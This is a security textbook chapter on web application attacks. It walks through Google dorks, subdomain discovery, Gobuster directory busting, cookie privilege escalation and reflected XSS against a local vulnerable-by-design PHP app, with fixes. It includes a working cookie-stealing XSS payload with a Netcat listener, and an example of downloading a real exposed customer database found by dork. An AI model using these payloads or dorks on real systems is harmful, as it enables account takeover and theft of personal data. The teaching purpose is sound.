# Chapter 9 - Web Application Attacks
![](web_attacks.jpg)

Web applications are often made accessible to the internet so anyone can access them.  Doing so opens these sites up to anonymous attacks from anywhere in the world.  This chapter will focus on the risks web applications face and some common attack techniques and vulnerability classifications.  Several of the activities and exercises used throughout the chapter use a vulnerable by design web application run within a local environment.  Other activities explore the attack surface of exposed web applications from an internet attacker's perspective.  Using this vulnerable application, we will explore how to identify, exploit, and treat a few of the most common web application vulnerabilities.

**Objectives**
1. Explain the risks associated with web applications and how they can be tested.
2. Demonstrate passive and active reconnaissance and discovery techniques of web applications.
3. Conduct a directory busting attack against a victim web application using Gobuster.
4. Understand how web applications manage sessions and escalate privileges of a vulnerable application.
5. Perform cross site scripting and SQL injection attacks and remediate their vulnerabilities.
## Web Security Risks
In order to secure a web application, it is important to understand the impacts resulting from a security breach.  Without this, many web application stakeholders such as developers, system administrators or business managers might not take the treatment of web application security risks seriously.  If the risks are not well understood, or worse yet fully dismissed, then the likelihood and impact of realizing those risks increases dramatically.  Every web application's impact will vary depending on the organization, the type of data that is processed, and many other factors we could imagine.

>[!activity] Activity 9.1 - Web Security Risks
>Take a few minutes to critically think why web application security is important.  Try to thoroughly consider the following questions:
>1. What can happen if there are weaknesses in web security?
>2. How can those weaknesses be used to impact the greater organization?
>3. How many weaknesses are there and what level of impact would each one have?

We might imagine that an untreated web application vulnerability could lead to the complete compromise of an entire organization's systems and data.  Other vulnerabilities could lead to the compromise of individual web application user accounts and their respective data.  Yet more vulnerabilities could result in the takeover of a web application's integrated systems.  The impact of these, and many other vulnerability scenarios, can be extremely high as web applications are often facing the public internet which can act like a front door to an organization's network.

In the previous Web Application Defense chapter, we introduced the OWASP Top 10, which is a list of generalized and common web application risks.  The list outlines broad categories of risk and its supporting documentation describes examples of web application vulnerabilities associated with that risk.  It is a useful reference to categorize and prioritize the types of issues a web application has, but it does not provide a comprehensive mapping or description of all the vulnerabilities applications to which it could be exposed.  For example, number three on the 2021 OWASP Top 10 list is *injection*, which goes on to describe common injection attacks such as SQL and OS commands. [^1]  But there are many other injection attacks not mentioned that would be valuable to web application defenders.

The MITRE project, *Common Weakness Enumeration (CWE)*, attempts to aggregate and correlate software vulnerabilities into a classification scheme in much richer detail than the generalized format OWASP Top 10 provides us.  The CWE library, which can be browsed at https://cwe.mitre.org/, is currently comprised of nearly one thousand weaknesses across software and hardware.  Each weakness is tracked using a unique ID with the syntax `CWE-##` and a title.  For example, CWE-77 `Improper Neutralization of Special Elements used in a command ('Command Injection')` screenshot is below. [^2]  

![[../images/09/cwe_command_injection.png|CWE Command Injection Page]]

OWASP Top 10 maintainers attribute CWEs with each of the listed top 10 risk categories.  Within each CWE entry are verbose descriptions, other related CWEs and categories, technical impacts, detailed examples with code snippets, real world vulnerabilities discovered, and mitigation strategies to cure the weakness.  Security professionals in this space, such as Application Security Engineers or Web Application Penetration Testers, often reference the CWEs related to discovered vulnerabilities.  Referencing CWEs supports identified issues and streamlines conversations with other stakeholders such as managers or developers.  But the security professional wouldn't use the CWE database as a means to systematically test an application as it is not organized in a manner that is conducive to efficient testing.

A security professional could use a testing framework designed in a natural flow to identify vulnerabilities.  A framework is almost like a checklist that supports a tester from missing classes of vulnerabilities they might otherwise forget by working off their infallible memory.  One great resource that attempts to organize such testing efforts is the *OWASP Web Security Testing Guide (WSTG)* available at https://owasp.org/www-project-web-security-testing-guide/stable/.  This is another open-source and free resource sponsored by the OWASP Foundation.  The first few sections of the guide introduce secure development practices and instructions on how to use the guide.  Of particular interest is section 4, Web Application Security Testing, that outlines many web application attack vectors in a logical order.  Major subsections of section 4 include the following:

- Information Gathering
- Configuration and Deployment Management Testing
- Identity Management Testing
- Authentication Testing
- Authorization Testing
- Session Management Testing
- Input Validation Testing
- Testing for Error Handling
- Testing for Weak Cryptography
- Business Logic Testing
- Client-side Testing
- API Testing

Each of these subsections are further broken down into yet further subsections that are tailored to specific attack vectors.  Continuing with our earlier command injection topic, which was identified in the OWASP Top 10 and the CWE, is the WSTG's subsection 4.7.12 Testing for Command Injection. [^3] The WSTG entry for command injection provides an overall summary, testing instructions which include the technical details and malicious payloads to attempt, as well as recommended remediation steps.  Unlike CWE which categorizes and supports the type of vulnerability, WSTG entries give detailed testing instructions on how to approach the discovery of the vulnerability.

![[../images/09/wstg_command_injection.png|WSTG Testing for Command Injection Page]]

The remainder of this chapter will explore the practical demonstration of web application security vulnerabilities.  It will not be comprehensive and interested readers are encouraged to explore the mentioned resources to learn more about this risky and highly-in-demand information security sub-discipline.
## Application Discovery
I have personally heard on more than one occasion management of organizations making the argument that security is not a concern because the business was too small or otherwise not significant enough to be targeted by threat actors.  That could not be further from the reality of how the average attacker targets their victims.  While it is feasible that a malicious actor might target a specific organization for explicit reasons that speak true to misinformed managers with whom I have dealt, the majority of attacks come from opportunity.  As so many organizations have a web presence now, with robust web applications facing the internet, as well as the use of countless *software as a service (SaaS)* applications, the opportunity for attacks is very high.  

Because the internet is so vast, and well indexed, attackers leverage the ability to detect application types using free and available online resources.  For instance, they will identify a vulnerability in a technology and then seek all the instances on the internet that are using the vulnerable technology to create a population to attack.  Then they systematically attack that population to achieve some impact.  They might use those compromised systems in a botnet, to ransom, or sell, access to another criminal group.  In this section we will explore a few ways attackers can use internet available resources to identify potential targets.  We will not cover all the methods, but you should develop a general understanding of how easy it is to conduct *passive reconnaissance* against web applications.
### Google Dorks
Search engines constantly scour the internet's IP ranges, registered domains, and shared links.  They cache and index web site context for their web-based querying or search tools.  Any anonymous internet user can use these search tools to find internet content.  These search engine organizations do this by creating bot programs called *crawlers* that scrape a targeted website for content and links to other internet resources and then repeat the process.  Crawlers will periodically revisit the site to identify any changes and then update its records.  They are extremely good at finding and categorizing files on the internet that supports the business model of search engine companies.  Afterall, search engine companies like Google, want to provide their userbase with quality results, so the more accurate and expansive the index generated by crawlers, the better experience for users and the more popular it will become.

Anyone reading this text undoubtedly would have used a search engine recently and understands the basic premise of searching the internet.  Visit the search engine page or built-in search/URL field in a browser, enter a few key words related to what you are looking for, and be presented with a list of many websites all but guaranteed related to what you are seeking.  But that only describes the basic search query and most of the popular search engines support *advanced queries*.   For instance, on Google's Advanced Search page, you tailor searches to deliver exact phrases, exclude items, or target specific file types or domains. [^4] 

Combining the thoroughness of crawlers, powerful search indexes, and use of advance search features empowers anyone to query for targeted items, including attackers.  For instance, assume that a malicious actor finds a novel vulnerability in Atlassian's Confluence web application and wants to find a list of potential targets to attack.  They could use Google's advanced search to find all web sites whose title includes the word "confluence".  In another example, maybe an attacker wants to search for publicly exposed SQL backup files that include sensitive information like the usernames and passwords of a custom web application.  This attacker could use an advanced query that searches for the file type ".sql" and the keyword "backup".  If we use our imagination, we produce a list of potential things to search for on Google that have a material security interest.  Such search criteria syntax is called a **Google Dork** and communities have been formed to crowdsource lists of thousands of interesting dorks.

> [!activity] Activity 9.2 - Google Dorks
> We explored the Exploit Database website in the Security Systems chapter as it contains a library of exploit code for known vulnerabilities.  This site also contains a crowdsourced library of Google dorks named the *Google Hacking Database (GHDB)*. [^5]   This database is constantly being added to and currently contains nearly ten thousand entries.  Conveniently, it has a search feature to narrow down what we could target.  I can identify several dorks related to searching for backups of SQL databases, as demonstrated in the following screenshot. 
> 
> ![[../images/09/dork_activity_dorks.png|GHDB Search for SQL Backup Dorks]]
> 
> The 9th dork on the list looks interesting to me as it is dynamic using "or" operators and a wide range of SQL backup related keywords.  Jumping to a fresh browser, I search the dork and find several interesting websites indexed by Google.  I took the liberty of redacting some of the specific details of the first entry.
> ![[../images/09/dork_activity_search.png|Google Dork Results for SQL Backup Files|500]]
> I select the first page that is returned, and I am presented with a small list of zipped SQL files that are a few years old.
> ![[../images/09/dork_activity_dbs.png|List of SQL Backups|400]]
> Downloading and opening the first SQL backup file, I can see a table called customers that includes columns like email, date of birth, password, API token, phone number, bank name, account number, and other less interesting information.
> ![[../images/09/dork_activity_customer_schema.png|SQL Backup Customers Table Schema|500]]
> The next command is an insert command that contains the information of a couple dozen "customer" accounts with sensitive records.
> ![[../images/09/dork_activity_customer_values.png|Customer Table Values|550]]

### Website Discovery
The *uniform resource locator (URL)*, or web address, is comprised of the scheme/protocol, subdomain, domain, top level domain, and path to the file.  Take the following URL as an example:

```
https://www.google.com/
```

The protocol is `https://`, the subdomain is `www`, the domain is `google`, the top-level domain is `com`, while the path is `/`.  Once a system administrator purchases a domain from a registrar and configures its nameservers, they then create an apex (A) DNS record which points the domain to a specific IP address.  But the administrator can create other subdomains with corresponding CNAME records that point to other IP addresses.  Any number of subdomains can be created this way without requiring the purchasing of additional domains.  In fact, any number of nested subdomains can also be created!  This means that a given domain may have multiple web applications nested under it facing the public internet.

Once an attacker has a target domain, they can use search engines to discover other web sites and applications related to the domain.  The previous section described search engine web crawlers and their indexing capabilities.  We can use our advanced querying knowledge to identify all of the subdomains a domain might have by using Google dorks.  Imagine I wanted to target Yahoo and find all of their subdomains.  I could search for all pages for the domain and then note the subdomains that are listed using the `site:` dork.  I will use the following search query in Google to list all Yahoo webpages.

```
site:yahoo.com
```

![[../images/09/yahoo_search.png|Google Dork Yahoo Site]]

The first couple of results show `login.yahoo.com` and `fr.yahoo.com` subdomains, and then there are some 109 million additional pages.  As I am trying to compile a list of all the subdomains Yahoo has, I note these first two and then exclude them from my subsequent queries using the minus character.

```
site:yahoo.com -site:login.yahoo.com -site:fr.yahoo.com
```

![[../images/09/yahoo_subdomains.png|Refining Dork to Exclude Select Subdomains]]

The next two subdomains are `shopping.yahoo.com` and `finance.yahoo.com` and the total results are now about 86 million.  Not bad eliminating 23 million records!  I add shopping and finance to my growing list of discovered subdomains for Yahoo and repeat the process until I have exhausted all Google results.  You might be thinking that this task could be automated, and you would be right!  Check out the `Sublist3r` tool by aboul3la on GitHub. [^6]   This open-source tool, written in Python, scrapes search engines for a given domain and returns a list of subdomains.  Be aware that, as Google is quite good at detecting and thwarting automated scans such as these by placing CAPTCHAs in responses.

>[!info] Info - OSINT
>*Open-source intelligence (OSINT)* is the passive reconnaissance technique of using available information on a target, usually on the internet or public sources.  Many of the activities discussed in this section are OSINT techniques, although there are many more that are not covered in this chapter.

There are other methods to discover subdomains on a target.  One of my favorite sites is `crt.sh` which gathers TLS certificate information on domains and compiles it into a searchable online database.  Due to *certificate transparency*, the certificate may list all subdomains that the certificate is valid for.  This listing can be collected as yet another source to compile a list of domain targets.  The following screenshot is taken from crt.sh after querying for "google.com".  It returns a long list of Google subdomains!

![[../images/09/crt_sh.png|Crt.sh Query for Google Subdomains]]

## Web Attacks
Many types of web application attacks that can lead to the compromise of accounts, systems, and data have been identified by the security community.  Successful exploitation of web vulnerabilities could even serve as the beachhead from where additional attacks against a network are waged.  This section will not cover all categories of web application attacks, but will instead cover a few common vulnerabilities, their exploitation, and how to mitigate them.
### Directory Busting
Web servers maintain files that can be downloaded by clients.  Sometimes these files are dynamically generated by the web server or are single-page applications that acquire data through APIs.  Irrespective of the type, web servers often contain static files served from the server's web root directory that are available to be downloaded.  This is usually purposeful as the developer or web administrator expects clients to download the file.  But other times a file is inadvertently added to the web root due to negligence or under the misbelief that no one would find it.  It is true that a search engine's crawler will not likely find a hidden file on a web root if there is no reference or link to it from within the web application; however, they could be discovered through guessing.

Take the example of a file named `backup.sql` or `staging.zip`.  It is imaginable that these files could contain sensitive information and be mistakenly left in the web root of a server.  We could attempt at blindly guessing common filenames and extensions and if we are lucky, we could stumble upon a download.  The process of guessing web server paths and files using a dictionary list is called **directory busting**.  There are many tools that perform this activity and several wordlists that contain common folder names, file names, and extensions from which to draw guesses.  Combining these tools and wordlists while targeting a website could return an HTTP status 200 response, or perhaps a response that does not include an error message.  Filtering out the invalid responses and displaying only valid responses maps out a web application's directories and files somewhat like a *sitemap*.

>[!activity] Activity 9.3 - Directory Busting
>Let us demonstrate a directory busting attack against a "vulnerable by design PHP application" that I created.  I will run the application in a Docker container and use the directory busting tool Gobuster on my Kali VM.  I already have Docker installed from activities performed in the Web Application Defense chapter.  Consider revisiting the last chapter for details on the installation and configuration of Docker, if needed.
>
>After starting the Kali VM and opening a terminal, I download, or clone, the vulnerable-site PHP application using the following git command.
>```bash
>git clone https://github.com/dhammon/vulnerable-site
>```
>![[../images/09/bust_activity_clone.png|Cloning Vulnerable Site|600]]
>Once cloned, I change the directory to vulnerable-site and create a new container named vulnerable-site from a LAMP image by mattrayner.  The container maps port 80 to my host's port 80 while also sharing the app folder from the cloned repository.
>```bash
>cd vulnerable-site
>docker run -it -d -p "80:80" -v ${PWD}/app:/app --name vulnerable-site mattrayner/lamp:0.8.0-1804-php7
>```
>![[../images/09/bust_activity_docker_run.png|Running Vulnerable Site as Docker Container|600]]
>The LAMP image is downloaded and includes preinstalled Linux, Apache, MySQL, and PHP stack.  I can check the status of the running container using the following Docker command.
>```bash
>docker container ls
>```
>![[../images/09/bust_activity_list_container.png|Listing Running Containers|600]]
>After waiting a few minutes for the container to fully load, I run the db.sh script on the container to set up the application's database.  The script installs the database tables and populates it with data, which is common for administrators to do when performing migrations or releases.
>```bash
>docker exec vulnerable-site /bin/bash /app/db.sh
>```
>![[../images/09/bust_activity_db_run.png|Setting Up Database on Container|600]]
>Everything should be set up, so I test the application by launching Firefox and navigating to http://127.0.0.1/.
>![[../images/09/bust_activity_app_test.png|Vulnerable Site Application Running in Browser|300]]
>I shift focus now to attacking this vulnerable-site.  I hope to find valuable information that could help me log into the application.  The first step many attackers take after finding a target site is to map the application and hunt for exposed pages or files.  I will use Gobuster for my directory busting activity, but I first need to install it.
>```bash
>sudo apt install gobuster -y
>```
>![[../images/09/bust_activity_install_gobuster.png|Installing Gobuster on Kali|600]]
>With Gobuster successfully installed, I am ready to launch my directory busting attack.  I specify Gobuster to do a directory busting attack supplying it with the URL of the target, a directory wordlist preinstalled on Kali, ten threads, and to look for PHP and SH files.
>```bash
>gobuster dir -u http://127.0.0.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -x php,sh
>```
>![[../images/09/bust_activity_busting.png|Directory Busting Vulnerable Site|600]]
>Within a few seconds, Gobuster identifies a couple of PHP files and the db.sh staging file!  I navigate to http://localhost/db.sh which downloads the script file.
>![[../images/09/bust_activity_download.png|Downloading DB Script|600]]
>Opening the db.sh file in a text editor reveals a script that installs a database named company and a table called users.  Then the script creates two records in the user table that includes the usernames and cleartext passwords.
>![[../images/09/bust_activity_content_review.png|Contents of DB Script File|600]]
>Jumping back to the login page of Vulnerable Site, I enter the username `admin` and password `SuperSecret1!`, then log in and hit the Welcome page!
>![[../images/09/activity_bust_login.png|Administrator Login|600]]

### Solving Stateless HTTP
As described in the Web Applications Defense chapter, HTTP is a stateless protocol which means that each request and response is mutually exclusive.  This is a challenge for web applications as often the site's creators want to maintain the ability to track individual users over time.  It is especially important when the application needs to control access to pages given a user's authenticated context.  Without a solution users would have to re-authenticate, or log in again, for each authenticated page requested.  Obviously, that would degrade user experience.  Therefore, a number of technologies have been developed over the decades to solve the authenticated user tracking problem.  

Web applications can be configured to establish a **session** when a user requests a page.  The session is a file stored on the web server, or as data in a caching server, that will contain information related to the user of the site.  Session files are named or identified by a long and random string to ensure that no two session identifiers collide.  The developers of the web application can store any information they wish within the session, such as specific user information like an access role or if the user has been authenticated.  Storing information within the session ensures security as the data within the session file can only be updated by the application and not the user directly.

Web applications that use sessions will respond to user requests with the *Set-Cookie* header that contains the name and value of a cookie.  A cookie is a piece of data that is stored on the client's computer and accessible by the client's browser.  The name of the cookie could be anything meaningful to the application, but an example could be "access-token" or "SESSID".  The value of this cookie would be the session identifier, that long and random string that is used to identify the session file on the web server.  Additional requests to the web application from the client will automatically include the *Cookie* header that includes the cookie name and value.  This is how the client and the web server can retain information between requests and responses, such as user log on status and permissions.  

![[../images/09/cookie_session_diagram.png|Cookie and Session Handling|450]]

The diagram above illustrates the concept of a session and cookie used to store authentication information.  Assuming the client has visited and logged into a site previously, they submit a cookie "token=123abc" to the web server.  The web application looks up the session 123abc's "logged_in" value and confirms that the user's state is True or logged in.  The application then responds with the request page and data since the user was authenticated.  As long as the client submits a valid cookie, the web application looks up the session file on the web server and identifies that the user is logged in and allowed to request the page or data before returning an appropriate response.  If the user submits a request for an authenticated page without a valid cookie, then the web application would respond with an access denied, or equivalent, response.

Protecting web server session files is an integral part of securing web applications.  Weaknesses in this area would undermine web application account security which is a significant concern.  Session identifiers, which are used as cookie values client side, should be long and have high entropy.  The randomness of the value protects the session from being guessed, calculated, or brute-forced.  The web server, or system storing session information, should be well protected by applying least privileged access to the session files.  The web application must avoid *business logic flaws* or bugs that allow the bypassing of authentication and authorization controls that rely on sessions.  A common example of this is relying on a cookie value as an indicator of authentication or authorization state.  For instance, imagine an application that sets a cookie called "role" with a value of "user" and relies on the value when determining if a request is authorized to access a page or data.  An attacker could abuse this vulnerability by changing the cookie value to "administrator" and submitting a request to gain unauthorized access to pages or data low privileged to which users do not have access.  This vulnerability could be avoided by storing authorization states within a session file on the server side and not as a client-side cookie.

Client-side cookies used for sensitive operations such as storing users' authentication and authorization states, must also be protected.  If a client-side cookie is obtained by an attacker, they would be able to use it to access the web application as the user.  This means that the attacker would not need to know the victim's password, also bypassing any multi-factor authentication security, and could navigate the web application without scrutiny.  Some web applications require that sensitive operations, like bank transfers or changing email addresses, re-authenticate to mitigate the risk of a victim's cookie being compromised.  The major browser developers have embedded security attributes to the *cookie jar*, where all cookies are stored on the client browser, that protect the cookie from attack.

![[../images/09/cookies.png|Browser Cookies for Google]]

The screenshot above was taken from the development tools built into Microsoft Edge after visiting google.com.  Choosing the Application tab, expanding the Cookies folder in the left navigation pane and selecting the site reveals all the cookies set by Google.  Examining the columns of the cookie pane shows the following fields and their impact on security:

- **Name** - The cookie's name.
- **Value** - The value of the cookie associated with the name.
- **Domain** - Determines which hosts can receive the cookie.  Values for other sites here are called *third-party cookies* which can be used to track users between sites they visit.
- **Path** - The URI path to which the cookie is applied.  In this example, the cookie applies to all paths of the domain.
- **Expires** - The date that the cookie is no longer valid.  This value can also be "session" which means that the cookie is expired when the browser closes.
- **Size** - The number of bytes that make up the cookie value.
- **HttpOnly** - A boolean setting that instructs the browser if JavaScript is allowed to handle the cookie.  This setting mitigates the effects of *cross-site scripting (XSS)* attacks; however, it does not prevent *reverse browser* attacks.
- **Secure** - Another boolean setting that instructs the browser to only send the cookie over encrypted HTTP channels.
- **SameSite** - This attribute supports None, Lax (or blank), and Strict values informs the browser if other sites are allowed to use the cookie.  The default Lax setting allows only the domain and its subdomains from using the cookie.  This setting mitigates *cross site request forgery (CSRF)* attacks.

As you can tell, not all cookies need protection and several of the cookies from the previous screenshot do not have protections enabled because of their low attack value.

> [!activity] Activity 9.4 - Cookie Privilege Escalation
> A vulnerable web application might rely on the use of cookies to configure authentication or authorization settings instead of using the server-side session storage.  I will demonstrate a vulnerable web application that relies on a client-side cookie to access restricted pages.  This activity will reuse the Vulnerable Site container setup in the previous activity.
> 
> I launch the Kali VM, open a terminal and restart the vulnerable-site docker container used in the previous activity.
> ```bash
> docker start vulnerable-site
> docker container ls
> ```
> ![[../images/09/cookie_activity_start.png|Restarting Vulnerable Site Docker Container|600]]
> With the container restarted, I open Firefox, navigate to http://127.0.0.1/, and login with the low privilege user `daniel` whose password is `Password123` where I am directed to the Welcome Page.
> ![[../images/09/activity_authz_login.png|Low Privilege Login Welcome Page|600]]
> Logged in as the low privileged user, I press the "Admin Page" link on the Welcome Page and get an UNAUTHORIZED message.
> ![[../images/09/activity_authz_unauth.png|Unauthorized Admin Page Request|600]]
> 
> While logged in, I open the developer tools (F12) and enumerate the available cookies.  Firefox is a little different than Edge where the cookies are under the Storage tab.
> ![[../images/09/cookie_activity_enum.png|Developer Console Cookies]]
> I see there is a PHPSESSID cookie which is the default session cookie used with PHP applications.  If an attacker were to obtain that cookie value, they could impersonate my user in the vulnerable application.  Another cookie that draws my attention is the cookie called "role" which has a value of "user".  Perhaps the Vulnerable Site uses this cookie value to direct users to pages that require elevated privileges.  To test this, I change the cookie value by double clicking its value field, typing "administrator", and then hitting enter.  
> ![[../images/09/cookie_activity_modify.png|Modifying Role Cookie to Administrator|450]]
> I refresh the page and see that I am presented with the Admin Page!
> ![[../images/09/activity_authz_admin_hack.png|Escalated Privileges and Revealed Admin Page|600]]
> Let us explore where this vulnerability was introduced into the application source code and how to fix it.  Navigating to the vulnerable site repository and the app folder, I can open the `index.php` page using Nano.
> ```bash
> cd vulnerable-site/app
> nano index.php
> ```
> ![[../images/09/cookie_activity_index.png|Opening Index Page|600]]
> The index.php page contains the source code for the login page.  About halfway down I see that the PHP function `setcookie` is used to create the role cookie with the supplied variable from the MySQL Users table. 
> ![[../images/09/cookie_activity_setcookie.png|Vulnerable SetCookie Function On Index.php|600]]
> The magic variable `$_SESSION` is used to store data within a session server side.  I update the vulnerable line to `$_SESSION['role'] = $role;` to avoid exposing the role setting to a user-controlled cookie.  I press CTRL+X and answer yes to save the file.
> ![[../images/09/cookie_activity_index_session.png|Replacing SetCookie With $_SESSION|550]]
> This fixes the application to not set the cookie, but the server still relies on the cookie when a user visits the authenticated Admin Page.  Investigating the `admin.php` file shows an "if" statement that uses the magic variable `$_COOKIE` for the role cookie.
> ![[../images/09/activity_authz_admin_page.png|Admin Page Cookie Vulnerability|600]]
> This magic variable relies on cookie "role" and needs to instead reference the session file on the server.  To fix it, and ensure that the application still works, I update the line to `if($_SESSION['role'] == 'administrator') {`. 
> ![[../images/09/activity_authz_admin_fix.png|Fixing Admin Page to Use $_SESSION|600]]
> After saving the file, I restart the browser and login using the low privileged `daniel` user.  Navigating back to the developer tools I see that the role cookie is no longer available!
> ![[../images/09/activity_authz_fixed.png|Role Cookie Removed|600]]
### Client Scripting
Modern web browsers have built-in JavaScript engines closely coupled with the *domain object model (DOM)* extending browser features and capabilities while enhancing user experience.  JavaScript runs in browsers and is currently the dominant programing language for dynamic front end development.  Web sites can run JavaScript code from a file downloaded locally, a remote source, or inline within other file types such as HTML.

Any system that runs, or executes, code has an interest to security because a vulnerability in that system could lead to *code injection* vulnerabilities.  Browsers running JavaScript are also susceptible to code injection which may result in an attacker running arbitrary JavaScript code in a client's browser.  These **cross-site scripting (XSS)** attacks are performed by injecting malicious JavaScript that victims execute which can compromise the user's web application account.  Imagine a payload that grabs the application's session token from the cookie jar and forwards it to an attacker-controlled system.  With this token, an attacker can access the web application as that user from any device!  These same vulnerabilities could even lead to the victim's device or system becoming compromised if the attacker is able to exploit a vulnerability in the browser itself.  This risk is usually limited to those who do not keep their browsers updated with the latest security patches, but there are many critical vulnerabilities discovered in modern browsers all the time.

> [!tip] Tip - JavaScript Everywhere
> Technically, XSS vulnerabilities can be found anywhere that JavaScript is able to run, which is not just the browser.  For example, many backend web servers now run JavaScript via NodeJS and many Microsoft Windows applications support scripting via Windows Script Host using JScript.  Even a PDF can run JavaScript!

There are at least three forms of XSS vulnerabilities.  *Reflected* XSS requires the participation of the victim, usually by clicking on a link to a vulnerable web application with an embedded malicious JavaScript payload.  *Stored* XSS is more dangerous as the attacker is able to supply the malicious payload to the web application in advance where it is stored and later retrieved by the victim after visiting a page on the site.  *DOM-based* XSS take advantage of embedding JavaScript within the browser's DOM and can be reflected or stored.  There is a less common fourth XSS vulnerability known as the *self* XSS where a user is socially engineered to run malicious JavaScript in their developer tools console.  Any of the three common XSS vulnerabilities always start with a source which is the user supplied input and end with a sink where the code is eventually rendered out within the browser by the victim.

To protect against these vulnerabilities, web application developers must ensure to validate untrusted inputs.  This work must be conducted server side as any client-side validation efforts can be easily circumvented since anything coming from the client can be manipulated.  Untrusted input can be any value that is received from the client, such as headers and parameters, or values received from other systems, such as databases or third-party APIs.  There are a few methods of validating input with varying degrees of effectiveness.  The best method is to deny all and then allow by exception, called *allowlisting* method or *whitelisting*.  In this approach, all input is assumed to be invalid unless it matches provided criteria, such as character length, allowed characters, or keywords.  This is the best input validation method that will provide the most risk mitigation, unless that validation allows for characters needed for an XSS payload like `", >, <, '` and others.  Alternatively, the *blocklisting* method, also known as the *blacklist*, can provide some mitigation capabilities by assuming all inputs are allowed unless they match a list of invalid characters or strings.  This is a risky undertaking as there are many ways creative attackers could encode their payloads to avoid the filter.  Regardless of the method chosen, seemingly safe input is passed along to the application and unsafe input is blocked, usually informing the user with an error.

I have often heard input validation and sanitization being used interchangeably, but there is a technical difference.  The last input validation control is called *sanitization* in which keywords or characters are removed from an input and then the remaining value is passed along to the application.  This method suffers from the same issue as blocklisting as the engineer assumes they will be able to capture all malicious characters and strings, which is unlikely.  Many developers prefer this approach as it enhances the user experience by avoiding having to provide a user with an error message and removes friction.  However, the sanitization of inputs would likely cause issues later when the application uses that modified data.  If sanitization is used, it must be recursively applied where the input is reinspected after the initial sanitization check until no more abusive characters or strings remain.  Otherwise, an attacker could provide a nested malicious string such as `<s<script>ript>` where the sanitization logic will remove the `<script>` tag, concatenate the remaining value producing `<script>`, and pass it along to the vulnerable web application.

While input validation deals with the vulnerability at the source, *output encoding* mitigates the risk at the sink.  The objective of output encoding is to render the input in a safe manner that will not be interpreted or executed by the client.  It does this by converting special characters into a safe encoding scheme and most languages have built-in functions that will perform this task.  Technically, XSS is due to improper handling of output, although mitigating the risk at the source and the sink ensures the most protection.

>[!activity] Activity 9.5 - Cross-Site Scripting
>Our Vulnerable Site container used in the last couple of activities also has a cross-site scripting vulnerability.  I will explore the discovery and exploitation of this vulnerability using the Kali VM.  Afterwards, I will demonstrate how to fix the underlying issue and validate the vulnerability's mitigation.
>
>Once the Kali VM is started and the Vulnerable Site is running, I launch Firefox, navigate to http://127.0.0.1/ and open the page's source by right clicking and selecting View Page Source.  Within the page source, I observe an HTML form with a hidden input named version with a value of beta.  This is one method web applications use to transfer data between requested pages.
>![[../images/09/xss_activity_source.png|View Source of Vulnerable Site Index Page|550]]
>I return to the login page and enter the low privileged username `daniel` and password `Password123` which places me at the Welcome Page.  The page includes a footer with the content "Version: beta" and I can also see that the URL has a GET parameter version with a value of beta.  
>![[../images/09/activity_xss_welcome.png|Welcome Page Version Rendering|600]]
>It appears this page is rendering the GET parameter value.  To test this idea, I change the value `beta` to `foobar` and reload the page.  The footer is updated with arbitrary values!
>![[../images/09/activity_xss_foobar.png|Changing Version Parameter|600]]
>Even though I am able to change the value, it does not indicate a vulnerability.  There could be input validation or output encoding protections that I will not know until I have tested them by trying other payloads.  One common XSS payload test is `<script>alert('xss')</script>` which is simple JavaScript that executes an alert box.  Using this benign payload demonstrates the ability to execute arbitrary code in a clear manner.  These demonstrations are sometimes called *proof of concepts (PoC)*.  I try the XSS test payload by replacing the `foobar` value in the version parameter and reload the page.  This time, an alert box is presented which demonstrates an XSS vulnerability!
>![[../images/09/activity_xss_poc.png|XSS POC|600]]
>This is usually enough evidence to recommend that a development team fix the vulnerability.  However, an attacker could go much further, such as by stealing a user's access cookie.  In the previous section we describe the importance of cookie security and when absent, leaves the cookie vulnerable to theft.  Opening the developer tools, navigating to the Storage tab and selecting the site shows that the `PHPSESSID` token does not have the `HttpOnly` attribute set.  This means that JavaScript is permitted by the browser to interact with the cookie.
>![[../images/09/xss_activity_cookie_review.png|PHPSESSID Cookie Security Check]]
>I can chain the cookie and XSS vulnerabilities into an exploit to steal the PHPSESSID cookie value.  Knowing the cookie value empowers an attacker to use the web application as the victim user.  I modify the previous alert box payload with `<script>var i=new Image;i.src="http://127.0.0.1:9001/?"+document.cookie;</script>` which references an image whose source is 127.0.0.1 on port 9001.  You can imagine replacing this IP address with one in the attacker's control, but since I am performing this demonstration on my local Kali VM, I will just use port 9001 as the attacker's server.  The source request includes a parameter value that references the cookie storage.  When a victim user follows a link with the embedded XSS payload for the Vulnerable Site, they will inadvertently send their cookies to an attacker-controlled server.  
>
>Before I can use this payload, I must convert it into a URL safe encoding scheme as the payload includes special characters used by the browser.  URL encoding is common enough and web applications automatically decode values prior to using them.  Here is the URL "safe" encoding of the previously mentioned payload that will steal a victim's cookie. 
>```
>%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
>```
>Before sending the URL with the payload to the victim, the attacker needs to set up a server to collect the cookie.  Using Netcat, I set up a listener on port 9001 which matches the payload's source.
>```bash
>nc -lp 9001
>```
>![[../images/09/xss_activity_listener.png|Netcat Listener on Port 9001|600]]
>The listener is standing by waiting for incoming connections.  With everything staged, the next step is to send the targeted victim a URL to Vulnerable Site with the malicious payload that will steal their cookie.  This requires that the victim be already logged into the Vulnerable Site.  Acting as the victim, and assuming the malicious link was sent to me by the attacker via email, I follow the URL and observe that the page partially renders but then hangs.
>```
>http://127.0.0.1/home.php?version=%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
>```
>![[../images/09/activity_xss_exploit.png|Triggered Exploit|600]]
>From the attacker's perspective monitoring the Netcat server listening on port 9001, I can see an incoming connection that includes the user's cookie!  From here the attacker could take the `PHPSESSID` cookie value and embed it within their cookie jar to access the site as the victim.
>![[../images/09/xss_activity_cookie_captured.png|Attacker Captured Cookie|600]]
>The rendering of the version variable on the page is quite the vulnerability!  It can be mitigated through input validation, output encoding, or both.  I will mitigate the vulnerability using the PHP `htmlspecialchars` function where the value is rendered.  This output encoding strategy will eliminate the page's ability to execute the malicious JavaScript code.  The vulnerability is on the last line of the `footer.php` page resulting from an echo statement that concatenates the version GET parameter.
>![[../images/09/activity_xss_footer.png|Vulnerable Echo in Footer File|600]]
>I update the vulnerable echo statement by wrapping the GET concatenation with the built-in `htmlspecialchars` function and save the file.
>```php
>echo "Version: ".htmlspecialchars($_GET['version']);
>```
